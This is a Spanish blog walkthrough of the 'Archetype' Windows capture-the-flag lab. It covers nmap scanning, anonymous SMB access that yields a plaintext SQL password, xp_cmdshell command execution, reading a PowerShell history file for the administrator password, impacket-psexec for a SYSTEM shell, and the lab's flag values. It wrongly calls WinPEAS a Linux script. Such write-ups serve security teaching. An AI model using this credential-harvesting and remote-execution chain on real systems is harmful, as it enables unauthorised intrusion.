---
title: Archetype
date: 2026-10-09T22:52:00
draft: false
description: |-
  Resolución de la maquina:
  -Archetype 🟣
  -Windows 🪟
  -Very Easy 🟢
ShowToc: true
cover:
  image: /img/Archetype_ Informe de Ciberseguridad.png
  alt: ''
tags: []
---

En el día de hoy vamos a resolver la máquina **ARCHETYPE.**

Vamos a analizar y resolver cada apartado.

Antes que nada, probamos que la IP funcione (muestro esto al ser máquinas principiantes):

![](/img/Captura%20desde%202026-10-09%2023-04-40.png)

Como vemos, esta es la IP que se nos proporciona, y con el comando `ping` probamos la conexión:

```powershell
┌──(dani㉿kali)-[~]
└─$ ping 10.129.95.187
PING 10.129.95.187 (10.129.95.187) 56(84) bytes of data.
64 bytes from 10.129.95.187: icmp_seq=1 ttl=127 time=44.7 ms
^C
--- 10.129.95.187 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss, time 1002ms
rtt min/avg/max/mdev = 44.721/44.721/44.721/0.000 ms
```

Ahora bien, vamos con la resolución.

#### Which TCP port is hosting a database server?

Aquí nos estarían preguntando qué puerto está hosteando la base de datos del servidor; esto lo podemos saber con el comando `nmap`, que sirve para descubrir puertos abiertos, entre otras funciones.

Usaremos el comando `nmap -sV <IP_OBJETIVO>`

`-sV:` Envía sondas a los puertos abiertos para determinar la información del servicio y la versión.

```powershell
┌──(dani㉿kali)-[~]
└─$ nmap -sV 10.129.95.187
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 23:11 +0200
Nmap scan report for 10.129.95.187 (10.129.95.187)
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

Como vemos, se muestran varios servicios abiertos; el que a nosotros nos interesa es el **Microsoft SQL Server** con puerto _1433_.

> **Respuesta**: 1433

#### What is the name of the non-Administrative share available over SMB?

Aquí nos están preguntando cuál es el nombre del recurso compartido no administrativo disponible a través de SMB; primero debemos saber qué es un recurso SMB.

El protocolo SMB es el que usa Microsoft para compartir archivos e impresoras en red; este trabaja en el puerto 445, el cual sale en el escaneo. Dentro de este protocolo encontramos 2 tipos de recursos:

- **Recursos administrativos (default/administrative shares):** Son carpetas ocultas que Windows comparte por defecto para los administradores. Siempre terminan con el signo de dólar (\*\*`$`\*\*). Ejemplos: `C$`, `ADMIN$`, `IPC$`. 
- **Recursos NO administrativos:** Son carpetas creadas o compartidas de forma pública o personalizada para que los usuarios normales puedan acceder (por ejemplo: `Compartido`, `Backups`, `Public`, etc.).

En este caso nos preguntan por los recursos no administrativos; esto lo podemos averiguar con el comando `smbclient`⁣, l cual permite interactuar con este tipo de archivos mediante smb.

Usaremos el comando `smbclient -L //IP OBEJTIVO/ -N`

`-L` Para listar 

`-N` Para que no pida contraseña.

```powershell
┌──(dani㉿kali)-[~]
└─$ smbclient -L //10.129.95.187/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Como vemos, todos los recursos son administrativos, menos **backups**, que es el que nos interesa.

> **Respuesta:** backups

#### What is the password identified in the file on the SMB share?

Ahora nos piden, dentro de esta carpeta descubierta, que averigüemos la contraseña en un archivo.

Ahora usaremos el comando; hora no listamos, sino que entramos y todavía de forma anónima y si hacemos un `dir` podemos ver qué hay aquí.

```powershell
┌──(dani㉿kali)-[~]
└─$ smbclient  //10.129.95.187/backups -N  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		5056511 blocks of size 4096. 2618178 blocks available
```

Como vemos aquí, lo tenemos; podemos ver que es un tipo de archivo que es para automatizar tareas en SQL Server de Microsoft y además es la versión de producción, por ello el `prod.`

Ahora con el comando `get` lo podemos descargar.

```powershell
┌──(dani㉿kali)-[~]
└─$ smbclient  //10.129.95.187/backups -N  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		5056511 blocks of size 4096. 2618178 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2,2 KiloBytes/sec) (average 2,2 KiloBytes/sec)
smb: \> exit
                                                                                                           
┌──(dani㉿kali)-[~]
└─$ ls
Descargas   Escritorio  Música      prod.dtsConfig  Público                                        Vídeos
Documentos  Imágenes    Plantillas  Proyectos      
                       
```

Como vemos, ya lo tenemos; ahora veamos qué tiene dentro:

```powershell
┌──(dani㉿kali)-[~]
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>             

```

Como vemos, aquí se muestra la contraseña M3g4c0rp123**.**

> **Respuesta:**   M3g4c0rp123

#### What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

Aquí pregunta qué script de la colección Impacket nos sirve para acceder con estas credenciales que hemos obtenido al servidor SQL de Microsoft y, si hacemos una breve búsqueda, se trata de **mssqlclient.py.**

> **Respuesta:**  mssqlclient.py

#### What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

Antes que nada, debemos acceder a la base de datos mediante este comando:

`impacket-mssqlclient 'ARCHETYPE/sql_svc':'M3g4c0rp123'@IP ATACANTE -windows-auth`

` -windows-auth` Define qué es un usuario de Windows, no de la base de datos (esto lo sabemos, ya que el usuario tiene el /, significando que es el nombre del sistema o del dominio de red).

```powershell
┌──(dani㉿kali)-[~]
└─$ impacket-mssqlclient 'ARCHETYPE/sql_svc':'M3g4c0rp123'@10.129.95.187 -windows-auth

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

Ahora que estamos dentro, nos preguntan qué procedimiento dentro de este gestor SQL nos da acceso a la terminal de comandos de Windows (cmd).

Y con una breve búsqueda vemos que es **`xp_cmdshell`**

> **Respuesta**: xp_cmdshell

#### What script can be used in order to search possible paths to escalate privileges on Windows hosts?

Aquí nos preguntan qué script podemos usar para escalar privilegios.

Para esto usaremos Winpeas,un famoso script para escalar privilegios en Linux.

> **Respuesta:** winpeas

#### What file contains the administrator's password?

Para encontrar el archivo que contiene la contraseña del administrador, debemos hacer una reverse shell, esto con el uso de xp_cmdshell y winpea.

Mostraré los pasos y explicaré todo:

![](/img/Captura%20desde%202026-10-10%2000-39-34.png)

Con esto hemos ubicado en nuestra máquina Kali Linux el winpea.exe, hemos abierto un servidor donde se puede descargar temporalmente y a través de xp_cmdshell lo hemos instalado.

(Winpea no me va, pero lo que hace es mostrar ficheros y señala en rojo el vulnerable para escalar privilegios; en este caso hubiera sido ConsoleHost_history.txt).

> **Respuesta:** ConsoleHost_history.txt

Ahora que de una vez tenemos acceso y hemos llegado al final de esta maquina,podemos proceder a las 2 flag:

```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
output                                                                    
-----------------------------------------------------------------------   
net.exe use T: \Archetype\backups /user:administrator MEGACORP_4dm1n!!   
exit                                                                      
NULL    
```

##### Submit the flag located on the sql_svc user's desktop.

Miramos en el directorio del usuario:

```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
output                             
--------------------------------   
3e7b102e78218e935bf3f4951fec21a3 
```

##### Submit the flag located on the administrator's desktop.

```powershell
┌──(dani㉿kali)-[~]
└─$ impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file osHNhwGe.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service rabF on 10.129.95.187.....
[*] Starting service rabF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

Con el impacket de nuevo,, ahora que tenemos las credenciales, entramos y:

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

Así hemos vencido esta maquina.

![](/img/pasted-image-1791588220389.png)




######
